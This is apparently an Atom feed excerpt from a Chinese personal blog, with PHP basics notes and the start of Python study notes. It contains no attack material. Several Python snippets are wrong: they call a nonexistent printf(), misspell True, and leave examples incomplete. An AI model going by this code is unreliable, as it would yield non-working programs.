        <link rel="alternate" href="http://imfanqie.top/2021/07/01/program/php/phpstudy/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
        <content type="html">&lt;p&gt;为了读懂 web 一些漏洞和原理，浅显学习了一下 php 语言，并做了一点简陋的笔记，方便回顾。&lt;/p&gt;
&lt;p&gt;后面还会不断的或是专业的学习这门语言。&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1. 变量以 $ 符号开始，不能包含空格，区分大小写。php 定义变量，不用声明变量类型。&lt;/p&gt;
&lt;p&gt;2. 以 &lt;code&gt;?php&lt;/code&gt;  开始，以 &lt;code&gt;?&amp;gt;&lt;/code&gt;  结尾。&lt;/p&gt;
&lt;p&gt;3. 在函数内调用全局变量，要用  &lt;code&gt;global&lt;/code&gt;  关键字，比如：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当然，也可这么引用：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;x&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;x&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$GLOBALS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;y&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;4. &lt;code&gt;static&lt;/code&gt;  作用域，用法语 c 语言差不多，让一个变量的值不会被清除或重置。&lt;/p&gt;
&lt;p&gt;5.echo 和 print 的区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;echo&lt;/code&gt;  - 可以输出一个或多个字符串，没有返回值，速度比 print 要快。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print&lt;/code&gt;  - 只允许输出一个字符串，返回值总为 1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;6. 类型比较， &lt;code&gt;==&lt;/code&gt;  只比较值，不比较类型； &lt;code&gt;===&lt;/code&gt;  既比较值也比较类型&lt;/p&gt;
&lt;p&gt;7. 定义常量时 可选择是否区分大小写区分，不区分则在后面加 &lt;code&gt;true&lt;/code&gt; ，例如：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;value&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;8. 并置运算符 (.)，例如&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$txt1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$txt2&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;9. 整除运算符 &lt;code&gt; intdiv()&lt;/code&gt;  ，该函数返回值为第一个参数除以第二个参数的值并向下取整数，例如 &lt;code&gt;intdiv(10,3)&lt;/code&gt;   值为 3&lt;/p&gt;
&lt;p&gt;10. 赋值运算符中    &lt;code&gt;a .= b&lt;/code&gt; , 相当于  &lt;code&gt;a = a . b&lt;/code&gt;  , 连接两个字符串。&lt;/p&gt;
&lt;p&gt;11. 比较运算符中   &lt;code&gt;x &amp;lt;&amp;gt; y&lt;/code&gt;  相当于  &lt;code&gt;x != y&lt;/code&gt;  ， &lt;code&gt;x!==y&lt;/code&gt;  会同时判断值和类型。&lt;/p&gt;
&lt;p&gt;12. 数组运算符中， &lt;code&gt;x + y&lt;/code&gt;  能拼接两个数组。&lt;/p&gt;
&lt;p&gt;13. 组合比较符 &lt;code&gt;&amp;lt;=&amp;gt;&lt;/code&gt; ，用法：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;if $a &amp;gt; $b, $c = 1;&lt;/p&gt;
&lt;p&gt;if $a &amp;lt; $b, $c = -1;&lt;/p&gt;
&lt;p&gt;if $a = $b, $c = 0;&lt;/p&gt;
&lt;p&gt;14. 数组，可以储存字符串，用 &lt;strong&gt;array()&lt;/strong&gt; 函数创建。&lt;/p&gt;
&lt;p&gt;关联数组，可以通过一个数组关联到另外的数组。&lt;/p&gt;
&lt;p&gt;部分有关数组的函数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sort () - 对数组进行升序排列&lt;/li&gt;
&lt;li&gt;rsort () - 对数组进行降序排列&lt;/li&gt;
&lt;li&gt;asort () - 根据关联数组的键值，对数组进行升序排列&lt;/li&gt;
&lt;li&gt;ksort () - 根据关联数组的键名，对数组进行升序排列&lt;/li&gt;
&lt;li&gt;arsort () - 根据关联数组的键值，对数组进行降序排列&lt;/li&gt;
&lt;li&gt;krsort () - 根据关联数组的键名，对数组进行降序排列&lt;/li&gt;
&lt;li&gt;count () - 用于返回数组元素的数量。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;15.foreach 循环，用于遍历数组。例如：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Taobao&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$value&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;PHP_EOL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;16. 常用函数&lt;/p&gt;
&lt;p&gt;创建一个函数用   &lt;code&gt;function xxx()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;strpos()&lt;/strong&gt;  用于在字符串内查找一个字符或一段指定的文本。&lt;/p&gt;
&lt;p&gt;如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果 未找到匹配，则返回 FALSE。&lt;/p&gt;
&lt;p&gt;17.php 魔术常量&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;__LINE__&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#报行号&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#报文件路径和文件名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;__DIR__&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#报文件所在目录&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;__FUNCTION__&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#返回函数名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;__CLASS__&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#返回类名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;__TRAIT__&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#trait 名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;__METHOD__&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#类的方法名，返回该方法被定义时的名字&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;__NAMESPACE__&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#当前命名空间的名称&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;18.php 命名空间（namespace）&lt;/p&gt;
&lt;p&gt;PHP 命名空间可以解决以下两类问题：&lt;/p&gt;
&lt;p&gt;1. 用户编写的代码与 PHP 内部的类 / 函数 / 常量或第三方类 / 函数 / 常量之间的名字冲突。&lt;br&gt;
2. 为很长的标识符名称 (通常是为了缓解第一类问题而定义的) 创建一个别名（或简短）的名称，提高源代码的可读性。&lt;/p&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 declare 语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;上面的知识点摘录于&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9waHAvcGhwLXR1dG9yaWFsLmh0bWw=&#34;&gt;菜鸟教程 php&lt;/span&gt;，更详细。&lt;/p&gt;
</content>
        <category term="php" />
        <updated>2021-07-01T03:03:51.726Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/06/29/program/py/pystudy/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
        <title>python学习中部分易忘知识点</title>
        <link rel="alternate" href="http://imfanqie.top/2021/06/29/program/py/pystudy/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
        <content type="html">&lt;p&gt;本文是我在 py 学习中总结梳理了一些常用的易忘的知识点，为方便回顾和复习，遂加以记录。&lt;/p&gt;
&lt;p&gt;本文我会不断的学习并总结。&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;1不希望出现转义字符起作用在printf中加rr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1不希望出现转义字符起作用在printf中加rr&#34;&gt;#&lt;/a&gt; 1. 不希望出现转义字符起作用，在 printf () 中加 r/R&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r &lt;span class=&#34;token string&#34;&gt;&#39;hello\n world&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#但要注意，最后一个字符不能是 \&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r &#39;hello\n world\&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#上面的写法是错的&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;hr&gt;
&lt;h2 id=&#34;2将数据输出到文件中去&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2将数据输出到文件中去&#34;&gt;#&lt;/a&gt; 2. 将数据输出到文件中去&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;D:/text.txt&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a+&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hello world&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; fp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;hr&gt;
&lt;h2 id=&#34;3相比于c语言多的常用数据类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3相比于c语言多的常用数据类型&#34;&gt;#&lt;/a&gt; 3. 相比于 c 语言，多的常用数据类型&lt;/h2&gt;
&lt;p&gt;布尔类型 ——bool (Ture , False)&lt;/p&gt;
&lt;p&gt;字符串类型 ——str (与 c 字符串类似)&lt;/p&gt;
&lt;p&gt;整数类型中：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;十进制&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#不用加开头&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;二进制&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0b&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 要加开头&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;八进制&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 0o &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;十六进制&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 0x &lt;span class=&#34;token 